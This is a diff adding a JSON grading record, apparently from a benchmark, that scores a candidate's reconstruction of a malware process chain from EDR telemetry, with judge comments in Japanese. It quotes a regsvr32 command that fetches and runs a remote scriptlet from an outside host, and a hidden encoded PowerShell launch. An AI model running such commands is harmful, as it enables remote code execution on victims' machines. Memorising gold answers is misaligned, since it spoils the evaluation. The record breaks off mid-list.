@@ -1,0 +1,849 @@
+{
+  "case_id": "s3_pt_04_powershell_mid_chain",
+  "judge_summary_ja": "候補は7ステップ中3ステップ（S3-08-S01, S3-08-S04, S3-08-S05）の主題・操作・対象を正しく復元したが、PowerShellおよび最終payloadのネットワーク接続（S3-08-S02, S3-08-S03, S3-08-S07）と自己複製起動（S3-08-S06）を欠落させた。CBCのステージ3可視EDRテレメトリ（Canonical CBC EDR telemetry event row）を提示できず、クリティカルエビデンス再現は全滅。順序はS4→S5のみ正しかった。近傍の無関係動作（eqnedt32→regsvr32、payloadの一時ファイル書き込み）や自己起動（powershell→powershell, cmd→cmd, payload→payload）の誤主張が混在し、重複主張も見られた。",
+  "chains": [
+    {
+      "chain_id": "s3_pt_04_powershell_mid_chain",
+      "gold_required_item_scores": [
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:subject",
+          "step_id": "S3-08-S01",
+          "kind": "subject",
+          "matched_candidate_excerpt": "regsvr32.exe（PID 3992）が外部URL http://ortrta.net:8080/sF5riGj4K26DK.sct からスクリプトをロードし、powershell.exe（PID 2340）を起動",
+          "score": "1",
+          "reason_ja": "候補は regsvr32.exe（PID 3992）を主語として明記。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:operation",
+          "step_id": "S3-08-S01",
+          "kind": "operation",
+          "matched_candidate_excerpt": "…powershell.exe（PID 2340）を起動",
+          "score": "1",
+          "reason_ja": "「起動」は started と同義で正しい。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:object",
+          "step_id": "S3-08-S01",
+          "kind": "object",
+          "matched_candidate_excerpt": "powershell.exe（PID 2340）を起動",
+          "score": "1",
+          "reason_ja": "対象プロセス powershell.exe（PID 2340）を正しく復元。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:critical_evidence",
+          "step_id": "S3-08-S01",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "「Canonical CBC EDR telemetry event row (Stage 3-visible)」の提示なし。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S02:subject",
+          "step_id": "S3-08-S02",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "PowerShellのネットワーク接続主語（PID 2340）を主張していない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S02:operation",
+          "step_id": "S3-08-S02",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "「initiated connection」を再現していない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S02:object",
+          "step_id": "S3-08-S02",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象 ortrta.net / 10.193.66.115:8080 を再現していない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S02:critical_evidence",
+          "step_id": "S3-08-S02",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBCステージ3可視EDRテレメトリのエビデンスがない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S03:subject",
+          "step_id": "S3-08-S03",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "PowerShellの別ポート接続（8443）主語を欠落。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S03:operation",
+          "step_id": "S3-08-S03",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "接続作成（initiated connection）の主張なし。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S03:object",
+          "step_id": "S3-08-S03",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象 ortrta.net / 10.193.66.115:8443 を再現していない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S03:critical_evidence",
+          "step_id": "S3-08-S03",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBCステージ3可視EDRテレメトリの提示がない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:subject",
+          "step_id": "S3-08-S04",
+          "kind": "subject",
+          "matched_candidate_excerpt": "powershell.exe（PID 2340）がcmd.exe（PID 1880）を起動",
+          "score": "1",
+          "reason_ja": "主語 powershell.exe（PID 2340）を正しく再現。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:operation",
+          "step_id": "S3-08-S04",
+          "kind": "operation",
+          "matched_candidate_excerpt": "…cmd.exe（PID 1880）を起動",
+          "score": "1",
+          "reason_ja": "起動（started）を正しく主張。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:object",
+          "step_id": "S3-08-S04",
+          "kind": "object",
+          "matched_candidate_excerpt": "cmd.exe（PID 1880）",
+          "score": "1",
+          "reason_ja": "対象 cmd.exe（PID 1880）を正しく再現。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:critical_evidence",
+          "step_id": "S3-08-S04",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBCステージ3可視EDRテレメトリの提示がない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:subject",
+          "step_id": "S3-08-S05",
+          "kind": "subject",
+          "matched_candidate_excerpt": "cmd.exe（PID 1880）がpayload.exe（PID 3208）を起動",
+          "score": "1",
+          "reason_ja": "主語 cmd.exe（PID 1880）を正しく再現。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:operation",
+          "step_id": "S3-08-S05",
+          "kind": "operation",
+          "matched_candidate_excerpt": "…payload.exe（PID 3208）を起動",
+          "score": "1",
+          "reason_ja": "起動（started）を正しく主張。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:object",
+          "step_id": "S3-08-S05",
+          "kind": "object",
+          "matched_candidate_excerpt": "path: \"C:\\\\Users\\\\aalsahee\\\\payload.exe\", child_pid: 3208",
+          "score": "1",
+          "reason_ja": "対象 C:\\Users\\aalsahee\\payload.exe（PID 3208）を内容的に再現。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:critical_evidence",
+          "step_id": "S3-08-S05",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBCステージ3可視EDRテレメトリの提示がない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S06:subject",
+          "step_id": "S3-08-S06",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "payload.exe（PID 3208）が子payload.exeを起動の主張なし。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S06:operation",
+          "step_id": "S3-08-S06",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "起動（started）の主張なし。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S06:object",
+          "step_id": "S3-08-S06",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象 payload.exe（PID 4964）を欠落。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S06:critical_evidence",
+          "step_id": "S3-08-S06",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBCステージ3可視EDRテレメトリの提示がない。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S07:subject",
+          "step_id": "S3-08-S07",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "payload.exe（PID 4964）の接続作成主張なし。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S07:operation",
+          "step_id": "S3-08-S07",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "initiated connection の主張なし。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S07:object",
+          "step_id": "S3-08-S07",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象 ortrta.net / 10.193.66.115:9999 を欠落。"
+        },
+        {
+          "item_id": "s3_pt_04_powershell_mid_chain:S3-08-S07:critical_evidence",
+          "step_id": "S3-08-S07",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBCステージ3可視EDRテレメトリの提示がない。"
+        }
+      ],
+      "candidate_action_claim_scores": [
+        {
+          "candidate_claim_id": "CA1",
+          "candidate_step_id": "CS1",
+          "claim_excerpt": "eqnedt32.exe（PID 2244）がregsvr32.exe（PID 3992）を起動",
+          "normalized_action_claim_ja": "eqnedt32.exe (PID 2244) が regsvr32.exe (PID 3992) を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA1:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "eqnedt32.exe（PID 2244）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "本評価チェーンは regsvr32 以降であり、祖父プロセスは対象外。"
+            },
+            {
+              "slot_id": "CA1:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "起動",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "評価対象の操作ではない。"
+            },
+            {
+              "slot_id": "CA1:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "regsvr32.exe（PID 3992）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "該当するGOLD項目がない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA2",
+          "candidate_step_id": "S1",
+          "claim_excerpt": "regsvr32.exe（PID 3992）が外部URL http://ortrta.net:8080/sF5riGj4K26DK.sct からスクリプトをロードし、powershell.exe（PID 2340）を起動",
+          "normalized_action_claim_ja": "regsvr32.exe (PID 3992) が powershell.exe (PID 2340) を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA2:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "regsvr32.exe（PID 3992）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:subject",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "GOLDの主語と一致。"
+            },
+            {
+              "slot_id": "CA2:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "起動",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:operation",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "started と同義の表現。"
+            },
+            {
+              "slot_id": "CA2:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "powershell.exe（PID 2340）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S01:object",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "対象プロセス名とPIDが一致。"
+            },
+            {
+              "slot_id": "CA2:command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "regsvr32.exe /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "none",
+              "reason_ja": "コマンドラインはGOLD必須項目に含まれないため採点対象外。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA3",
+          "candidate_step_id": "CS2",
+          "claim_excerpt": "regsvr32.exe（PID 3992）が外部URL http://ortrta.net:8080/sF5riGj4K26DK.sct からスクリプトをロード",
+          "normalized_action_claim_ja": "regsvr32.exe (PID 3992) が URL からスクリプトを取得/ロードした",
+          "slot_scores": [
+            {
+              "slot_id": "CA3:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "regsvr32.exe（PID 3992）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLDで求められるのはPowerShellのネットワーク接続であり、regsvr32のロードは対象外。"
+            },
+            {
+              "slot_id": "CA3:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "スクリプトをロード",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象チェーン外の操作。"
+            },
+            {
+              "slot_id": "CA3:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "http://ortrta.net:8080/sF5riGj4K26DK.sct",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLDの接続対象はPowerShell/8443,8080,9999であり、regsvr32のURL取得は不一致。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA4",
+          "candidate_step_id": "CS3",
+          "claim_excerpt": "powershell.exe（PID 2340）がcmd.exe（PID 1880）を起動",
+          "normalized_action_claim_ja": "powershell.exe (PID 2340) が cmd.exe (PID 1880) を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA4:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "powershell.exe（PID 2340）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:subject",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "主語が一致。"
+            },
+            {
+              "slot_id": "CA4:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "起動",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:operation",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "起動（started）と一致。"
+            },
+            {
+              "slot_id": "CA4:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "cmd.exe（PID 1880）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:object",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "対象が一致。"
+            },
+            {
+              "slot_id": "CA4:command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand ...",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "none",
+              "reason_ja": "コマンドラインはGOLD必須項目外。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA5",
+          "candidate_step_id": "CS4",
+          "claim_excerpt": "cmd.exe（PID 1880）がpayload.exe（PID 3208）を起動",
+          "normalized_action_claim_ja": "cmd.exe (PID 1880) が C:\\Users\\aalsahee\\payload.exe (PID 3208) を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA5:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "cmd.exe（PID 1880）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:subject",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "主語が一致。"
+            },
+            {
+              "slot_id": "CA5:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "起動",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:operation",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "起動（started）と一致。"
+            },
+            {
+              "slot_id": "CA5:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "path: \"C:\\\\Users\\\\aalsahee\\\\payload.exe\", child_pid: 3208",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:object",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "対象のパスとPIDを内容的に再現。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA6",
+          "candidate_step_id": "S1",
+          "claim_excerpt": "operation: \"process_start\" で subject_process.name と object.name がいずれも \"powershell.exe\"",
+          "normalized_action_claim_ja": "powershell.exe (PID 2340) が powershell.exe を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA6:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"powershell.exe\", pid=2340",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "自己起動という不自然な主張で、対応するGOLD項目がない。"
+            },
+            {
+              "slot_id": "CA6:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "process_start",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "操作は存在するが、当該主張は自己起動で不一致。"
+            },
+            {
+              "slot_id": "CA6:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "object.name: \"powershell.exe\"",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "対象が主語と同一の自己起動主張でGOLD不一致。"
+            },
+            {
+              "slot_id": "CA6:command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand ...",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "none",
+              "reason_ja": "コマンドラインは必須採点対象外。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA7",
+          "candidate_step_id": "S1",
+          "claim_excerpt": "execution_context.child_process: \"cmd.exe\", child_pid: 1880",
+          "normalized_action_claim_ja": "powershell.exe (PID 2340) が cmd.exe (PID 1880) を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA7:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "execution_context.parent_process: \"powershell.exe\", parent_pid: 2340",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:subject",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一内容はCA4で既にカウント済みのため重複。"
+            },
+            {
+              "slot_id": "CA7:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "（子プロセス生成の文脈）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:operation",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一ステップの重複主張。"
+            },
+            {
+              "slot_id": "CA7:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "child_process: \"cmd.exe\", child_pid: 1880",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S04:object",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一対象の重複主張。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA8",
+          "candidate_step_id": "S2",
+          "claim_excerpt": "operation: \"process_start\" で subject_process.name と object.name がいずれも \"cmd.exe\"",
+          "normalized_action_claim_ja": "cmd.exe (PID 1880) が cmd.exe を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA8:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"cmd.exe\", pid=1880",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "自己起動の誤主張。"
+            },
+            {
+              "slot_id": "CA8:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "process_start",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "当該主張自体が不正確。"
+            },
+            {
+              "slot_id": "CA8:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "object.name: \"cmd.exe\"",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "対象が主語と同一の自己起動でGOLD不一致。"
+            },
+            {
+              "slot_id": "CA8:command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "cmd.exe /c ...",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "none",
+              "reason_ja": "コマンドラインは必須採点対象外。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA9",
+          "candidate_step_id": "S2",
+          "claim_excerpt": "execution_context.child_process: \"payload.exe\", child_pid: 3208",
+          "normalized_action_claim_ja": "cmd.exe (PID 1880) が payload.exe (PID 3208) を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA9:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"cmd.exe\", pid=1880",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:subject",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一内容はCA5で既にカウント済みのため重複。"
+            },
+            {
+              "slot_id": "CA9:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "（子プロセス生成の文脈）",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:operation",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一ステップの重複主張。"
+            },
+            {
+              "slot_id": "CA9:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "child_process: \"payload.exe\", child_pid: 3208",
+              "matched_gold_item_id": "s3_pt_04_powershell_mid_chain:S3-08-S05:object",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一対象の重複主張。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA10",
+          "candidate_step_id": "S3",
+          "claim_excerpt": "operation: \"process_start\" で subject_process.name と object.name がいずれも \"payload.exe\"",
+          "normalized_action_claim_ja": "payload.exe (PID 3208) が payload.exe を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "CA10:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"payload.exe\", pid=3208",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "自己起動の誤主張で、GOLDのS3-08-S06は3208→4964で別PID。"
+            },
+            {
+              "slot_id": "CA10:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "process_start",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "当該自己起動主張は不正確。"
+            },
+            {
+              "slot_id": "CA10:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "object.name: \"payload.exe\"",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "対象が主語と同一で不一致。"
+            },
+            {
+              "slot_id": "CA10:command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "payload.exe",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "none",
+              "reason_ja": "コマンドラインは必須採点対象外。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA11",
+          "candidate_step_id": "S4",
+          "claim_excerpt": "payload.exe（PID 3208）が C:\\Users\\aalsahee\\AppData\\Local\\Temp\\_MEI32082\\base_library.zip に書き込み（file_write）",
+          "normalized_action_claim_ja": "payload.exe (PID 3208) が base_library.zip に書き込んだ",
+          "slot_scores": [
+            {
+              "slot_id": "CA11:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"payload.exe\", pid=3208",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "ファイル書き込みは本GOLDチェーンの必須項目ではない。"
+            },
+            {
+              "slot_id": "CA11:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "file_write",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象外の操作。"
+            },
+            {
+              "slot_id": "CA11:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "C:\\Users\\aalsahee\\AppData\\Local\\Temp\\_MEI32082\\base_library.zip",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象外のオブジェクト。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA12",
+          "candidate_step_id": "S5",
+          "claim_excerpt": "payload.exe（PID 3208）が …\\_MEI32082\\unicodedata.pyd に書き込み（file_write）",
+          "normalized_action_claim_ja": "payload.exe (PID 3208) が unicodedata.pyd に書き込んだ",
+          "slot_scores": [
+            {
+              "slot_id": "CA12:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"payload.exe\", pid=3208",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "ファイル書き込みは本GOLDチェーンの必須項目ではない。"
+            },
+            {
+              "slot_id": "CA12:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "file_write",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象外の操作。"
+            },
+            {
+              "slot_id": "CA12:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "C:\\Users\\aalsahee\\AppData\\Local\\Temp\\_MEI32082\\unicodedata.pyd",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象外のオブジェクト。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "CA13",
+          "candidate_step_id": "S6",
+          "claim_excerpt": "payload.exe（PID 3208）が …\\_MEI32082\\ucrtbase.dll に書き込み（file_write）",
+          "normalized_action_claim_ja": "payload.exe (PID 3208) が ucrtbase.dll に書き込んだ",
+          "slot_scores": [
+            {
+              "slot_id": "CA13:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: name=\"payload.exe\", pid=3208",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "ファイル書き込みは本GOLDチェーンの必須項目ではない。"
+            },
+            {
+              "slot_id": "CA13:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "file_write",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象外の操作。"
+            },
+            {
+              "slot_id": "CA13:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "C:\\Users\\aalsahee\\AppData\\Local\\Temp\\_MEI32082\\ucrtbase.dll",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象外のオブジェクト。"
+            }
+          ]
+        }
+      ],
+      "order_pairs": [
+        {
+          "before_step_id": "S3-08-S01",
+          "after_step_id": "S3-08-S02",
+          "score": "0",
+          "reason_ja": "S3-08-S02（PowerShellの8080接続）が未復元。"
+        },
+        {
+          "before_step_id": "S3-08-S02",
+          "after_step_id": "S3-08-S03",
+          "score": "0",
+          "reason_ja": "両ステップとも未復元。"
+        },
+        {
+          "before_step_id": "S3-08-S03",
+          "after_step_id": "S3-08-S04",
+          "score": "0",
+          "reason_ja": "S3-08-S03が未復元。"
+        },
+        {
+          "before_step_id": "S3-08-S04",
+          "after_step_id": "S3-08-S05",
+          "score": "1",
+          "reason_ja": "PowerShell→cmd 起動の後に cmd→payload 起動を正しい順で復元。"
+        },
+        {
+          "before_step_id": "S3-08-S05",
+          "after_step_id": "S3-08-S06",
+          "score": "0",
+          "reason_ja": "S3-08-S06（payload子プロセス）が未復元。"
+        },
+        {
+          "before_step_id": "S3-08-S06",
+          "after_step_id": "S3-08-S07",
+          "score": "0",
+          "reason_ja": "両ステップとも未復元。"
+        }
+      ]
+    }
+  ],
+  "error_flags": {
+    "target_missing": [
+      "s3_pt_04_powershell_mid_chain:S3-08-S02:subject",
+      "s3_pt_04_powershell_mid_chain:S3-08-S02:operation",
+      "s3_pt_04_powershell_mid_chain:S3-08-S02:object",
+      "s3_pt_04_powershell_mid_chain:S3-08-S03:subject",
+      "s3_pt_04_powershell_mid_chain:S3-08-S03:operation",
+      "s3_pt_04_powershell_mid_chain:S3-08-S03:object",
+      "s3_pt_04_powershell_mid_chain:S3-08-S06:subject",
+      "s3_pt_04_powershell_mid_chain:S3-08-S06:operation",
+      "s3_pt_04_powershell_mid_chain:S3-08-S06:object",
+      "s3_pt_04_powershell_mid_chain:S3-08-S07:subject",
+      "s3_pt_04_powershell_mid_chain:S3-08-S07:operation",
+      "s3_pt_04_powershell_mid_chain:S3-08-S07:object"
+    ],
+    "chain_mixing": true,
+    "hallucinated_claims": [
+      "powershell.exe (PID 2340) が powershell.exe を起動した",
+      "cmd.exe (PID 1880) が cmd.exe を起動した",
+      "payload.exe (PID 3208) が payload.exe を起動した"
+    ],
+    "unsupported_evidence": [],
+    "contradicted_evidence": [],
+    "nearby_action_false_positives": [
+      "eqnedt32.exe（PID 2244）がregsvr32.exe（PID 3992）を起動",
+      "regsvr32.exe（PID 3992）が外部URLからスクリプトをロード",
+      "payload.exe（PID 3208）の一時フォルダ内ファイル書き込み（3件）"
+    ],
+    "weak_grounding": true,
+    "false_positive_claims": [
+      "powershell.exe が powershell.exe を起動（自己起動）",
+      "cmd.exe が cmd.exe を起動（自己起動）",
+      "payload.exe が payload.exe を起動（自己起動）",
+      "eqnedt32.exe → regsvr32.exe 起動（チェーン外）",
+      "regsvr32.exe が URL をロード（チェーン外）",
+      "payload.exe の一時ファイル書き込み（チェーン外）",
+      "powershell.exe → cmd.exe 起動（重複主張）",
